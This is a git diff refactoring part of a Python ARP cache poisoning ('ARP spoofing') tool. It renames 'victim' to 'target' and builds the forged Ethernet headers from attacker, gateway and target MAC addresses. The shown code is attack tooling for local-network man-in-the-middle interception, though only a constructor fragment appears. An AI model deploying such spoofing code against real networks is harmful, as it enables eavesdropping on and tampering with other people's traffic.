@@ -4,7 +4,7 @@
 __author__ = 'EONRaider @ keybase.io/eonraider'
 
 """
-A low-level ARP cache poisoning (a.k.a "ARP spoofing") tool.
+A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
 """
 
 import argparse
@@ -13,22 +13,22 @@ import socket
 
 
 class ARPPacket(object):
+    ETHER_T = b'\x08\x06'  # Ethertype code of ARP per RFC 7042
 
-    def __init__(self, attacker_mac: str, gateway_mac: str, victim_mac: str,
-                 gateway_ip: str, victim_ip: str):
-        self.gateway_ip = socket.inet_aton(gateway_ip)
-        self.victim_ip = socket.inet_aton(victim_ip)
-
-        for mac_addr in attacker_mac, gateway_mac, victim_mac:
-            setattr(self, mac_addr, self._mac_to_hex(mac_addr))
-
-        ETHER_T = r'\x08\x06'  # Ethertype code of ARP
-        self.gateway_eth_header = self.gateway_mac + self.attacker_mac + ETHER_T
-        self.victim_eth_header = self.victim_mac + self.attacker_mac + ETHER_T
-
+    def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
+                 gateway_ip: str, target_ip: str):
+        self.gateway_ip = inet_aton(gateway_ip)
+        self.target_ip = inet_aton(target_ip)
         self.arp_header = None
         self.gateway_arp_packet = None
-        self.victim_arp_packet = None
+        self.target_arp_packet = None
+        self.attacker_mac = self._mac_to_hex(attacker_mac)
+        self.gateway_mac = self._mac_to_hex(gateway_mac)
+        self.target_mac = self._mac_to_hex(target_mac)
+        self.gateway_eth_header = self.gateway_mac + self.attacker_mac + \
+                                  self.ETHER_T
+        self.target_eth_header = self.target_mac + self.attacker_mac + \
+                                 self.ETHER_T
 
     @property
     def arp_header(self):
